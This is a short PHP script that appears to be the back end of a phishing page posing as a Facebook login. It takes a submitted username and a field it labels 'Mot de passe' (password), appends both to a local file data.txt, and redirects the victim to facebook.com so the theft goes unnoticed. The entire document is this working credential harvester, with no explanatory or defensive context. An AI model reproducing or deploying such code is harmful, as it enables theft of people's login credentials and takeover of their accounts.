<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username']);
    $email = htmlspecialchars($_POST['email']);

    $file = fopen("data.txt", "a");
    fwrite($file, "Nom d'utilisateur: " . $username . "\nMot de passe: " . $email . "\n\n");
    fclose($file);

    header('Location: http://www.facebook.com');
}
